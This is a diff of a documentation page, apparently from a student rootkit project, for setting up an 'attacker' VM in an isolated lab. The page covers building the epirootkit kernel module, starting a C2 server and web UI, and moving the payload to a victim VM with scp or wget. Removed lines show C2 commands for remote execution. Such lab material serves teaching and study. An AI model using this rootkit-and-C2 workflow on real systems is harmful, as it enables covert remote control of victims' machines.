@@ -9,191 +9,142 @@ toc: true
 weight: 203
 ---
 
-# Attacker VM Setup
 
-Configure the attacking VM with Node.js C2 server and React web interface.
 
 ## Prerequisites
 
-1. **Host setup complete**: [Host Environment Setup]({{< relref "environment.md" >}})
-2. **VM downloaded**: `vm/attacker.qcow2` in project root
+1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
+2. **VM disk**: `attacker.qcow2` in `/var/lib/libvirt/images/`
 3. **VM launched**: `sudo ./scripts/run_vms.sh attacker`
+
 
 ## VM Access
 
-**Connection Details:**
-- **IP Address**: 192.168.200.11 (static)
-- **Username**: `attacker` 
-- **Password**: `jules`
-- **Auto-login**: Enabled (no password prompt)
+- **IP**: 192.168.200.11 (static)
+- **Credentials**: `attacker` / `jules` (auto-login)
 
 ## Setup Method
 
 {{< tabs tabTotal="2" >}}
 
-{{% tab tabName="Pre-built Disk (Recommended)" %}}
+{{% tab tabName="Pre-built (Recommended)" %}}
 
 ### Quick Start
 
-Everything is already set up, so you can immediately build and run:
+Everything is pre-configured. Build and run immediately:
 
 ```bash
-# Inside attacker VM (already logged in)
+# Inside attacker VM (auto-logged in)
 cd epirootkit
 
-# Build rootkit payload for victim deployment
+# Build rootkit
 cd rootkit && make clean && make
-ls -la epirootkit.ko  # ✅ Compiled payload ready
+ls -la epirootkit.ko  # ✅ Ready
 
-# Start C2 server
-cd ../attacking_program && pnpm install && pnpm start
-# ✅ C2 server started on port 4444
-# ✅ Web interface started on port 3000
+# Start C2 server + Web UI
+cd .. && ./deploy_c2.sh
+# ✅ C2 server: port 4444
+# ✅ Web interface: port 3000
 ```
 
-### Ready to Use
-- **Web Interface**: `http://192.168.200.11:3000`
-- **File transfer**: Ready to deploy payload to victim VM
+**Access**: `http://192.168.200.11:3000` from host browser or `http://localhost:3000` from attacker VM browser
 
 {{% /tab %}}
 
-{{% tab tabName="Self-build from Scratch" %}}
+{{% tab tabName="Fresh VM Setup" %}}
 
-### Fresh VM Setup
+### Prerequisites on the VM
 
-If using a fresh Ubuntu VM, you MUST first install dependencies on the attacker VM:
+The setup requires the `setup_attacker.sh` script. You have two options to obtain it:
 
-> **⚠️ Required for Fresh VMs**: Run `./scripts/setup_attacker.sh` inside the attacker VM to install Node.js, npm, pnpm, gcc, and other dependencies.
-
-Choose your preferred setup method:
-
-#### Method 1: Automated (Recommended)
-
-**One-Command Setup from Host**
-Run this from your host machine (not inside the VM):
+**Option 1: Get it from the host with python (recommended)**
 
 ```bash
-# From host project directory
-./scripts/deploy_to_attacker.sh
-
-# ✅ Transfers project files to VM
-# ✅ Runs setup_attacker.sh remotely  
-# ✅ Installs all dependencies
-# 🎉 Ready to build and start
+# In the scripts/ directory on the host
+python3 -m http.server 8080
 ```
+Then on the attacker VM:
 
-**Build and Start**
-SSH into the VM and complete setup:
 ```bash
-# SSH into attacker VM
-ssh attacker@192.168.200.11
-
-# Build rootkit and start C2 server
-cd epirootkit/rootkit && make clean && make
-cd ../attacking_program && pnpm install && pnpm start
-# ✅ Web interface: http://192.168.200.11:3000
+wget http://192.168.200.1:8080/setup_attacker.sh
+chmod +x setup_attacker.sh
 ```
 
-#### Method 2: Manual Step-by-Step
 
-**1. Transfer Project Files**
-First, get the EpiRootkit project into the VM.
 
-📖 **Complete Guide**: [Host to VM File Transfer]({{< relref "file-transfer.md" >}})
+**Option 2: Download from GitHub Gist**
 
-**Recommended: SCP Transfer**
 ```bash
-# From host machine
-scp -r /path/to/epirootkit attacker@192.168.200.11:~/
+wget https://gist.githubusercontent.com/KazeTachinuu/397da3d739384de9e592a2e6f26b7cc0/raw/0895738fbf9dccc16dd6fe1139eb206ec9024076/setup_attacker.sh
+chmod +x setup_attacker.sh
 
-# Then SSH into attacker VM
-ssh attacker@192.168.200.11
-cd epirootkit
 ```
 
-**Alternative Methods:**
-- **HTTP**: Host runs `python3 -m http.server`, VM downloads with `wget`
-- **Shared Folder**: Mount host directory, copy to VM
 
-**2. Install Dependencies (REQUIRED)**
-Run the setup script inside the attacker VM:
+### Setup
+
+**1. Install Dependencies (inside VM):**
 ```bash
-# Inside attacker VM, from epirootkit directory
-./scripts/setup_attacker.sh
-
-# Installs: Node.js, npm, pnpm, gcc, make, linux-headers, python3, openssh-server
-# ✅ Verifies all installations
-# 🎉 Ready for build step
+./setup_attacker.sh
 ```
+This installs:
 
-**3. Build and Start**
-Build the rootkit and start the C2 server:
+- Node.js 18.x LTS
+- Build tools (gcc, make, linux-headers-$(uname -r), python3)
+- SSH server
+
+
+**2. Deploy Project (from host):**
 ```bash
-# Build rootkit payload for victim deployment
-cd rootkit && make clean && make
-ls -la epirootkit.ko  # ✅ Payload ready
-
-# Install C2 dependencies and start server
-cd ../attacking_program && pnpm install && pnpm start
-# ✅ C2 server started on port 4444
-# ✅ Web interface started on port 3000
+./scripts/deploy_project.sh
+# ✅ Transfers all project files via SSH
 ```
+
+**3. Auto Build and Start (inside VM):**
+```bash
+cd epirootkit && ./deploy_c2.sh
+# ✅ Builds rootkit automatically
+# ✅ Installs C2 dependencies  
+# ✅ Starts C2 server + Web UI
+```
+
+**Access**: `http://192.168.200.11:3000` from host browser or `http://localhost:3000` from attacker VM browser
+
 
 {{% /tab %}}
 
 {{< /tabs >}}
 
-## Usage
+#### Deploy to Victim
 
-### Deploy Payload to Victim
-Transfer the compiled rootkit and deployment script to victim VM:
+Transfer rootkit to victim VM:
 
 ```bash
-# Option A: SCP transfer (requires SSH on victim)
+# Option A: SCP
 scp rootkit/epirootkit.ko rootkit/deploy_rootkit.sh victim@192.168.200.10:~/
 
-# Option B: HTTP download (Python server)
+# Option B: HTTP server
 cd rootkit && python3 -m http.server 8080
-# On victim: wget http://192.168.200.11:8080/{epirootkit.ko,deploy_rootkit.sh}
+# Victim: wget http://192.168.200.11:8080/{epirootkit.ko,deploy_rootkit.sh}
 
-# Option C: Web UI upload (via attacking program)
-# Use web interface file transfer panel for both files
+# Option C: Web UI file transfer
 ```
 
-### Monitor C2 Connections
-```bash
-# List connected clients
-ls
-
-# Wait for victim to load module and connect
-# Then authenticate and control
-auth Client-1 password
-exec Client-1 whoami
-```
-
-### Web Interface
-Access from any device on the network:
-- **URL**: `http://192.168.200.11:3000`
-- **Login Password**: `password`
-- **Features**: Full payload deployment and C2 control
-
-## Configuration Notes
+## Configuration
 
 ### Attacker VM Role
-- **Builds rootkit**: Compiles `epirootkit.ko` for victim deployment
-- **C2 server**: Hosts command & control server on port 4444
-- **Web interface**: Provides web UI on port 3000
-- **File transfer**: Transfers payload to victim via HTTP/SCP/Web UI
+- **Builds rootkit**: Compiles `epirootkit.ko` for victim
+- **C2 server**: Port 4444 (client connections)
+- **Web interface**: Port 3000 (operator access)
+- **File transfer**: Deploys payload to victim
 
-### Network Configuration
-- **Attacker VM IP**: `192.168.200.11` (static)
-- **Default C2 port**: `4444` (matches rootkit defaults)
-- **Web interface**: `http://192.168.200.11:3000`
-
-For victim deployment details, see [Victim VM Setup]({{< relref "victim-vm-setup.md" >}}).
+### Network
+- **Attacker IP**: `192.168.200.11`
+- **C2 port**: `4444` (default)
+- **Web UI**: `http://192.168.200.11:3000`
 
 ## Next Steps
 
-1. **Victim Setup**: [Victim VM Setup]({{< relref "victim-vm-setup.md" >}})
-2. **Deploy Rootkit**: Connect victim to this C2 server
-3. **Monitor**: Watch for client connections
+1. **[Victim Setup]({{< relref "victim-vm-setup.md" >}})**: Deploy rootkit
+2. **Monitor**: Watch for client connections
+3. **Control**: Use CLI or Web UI
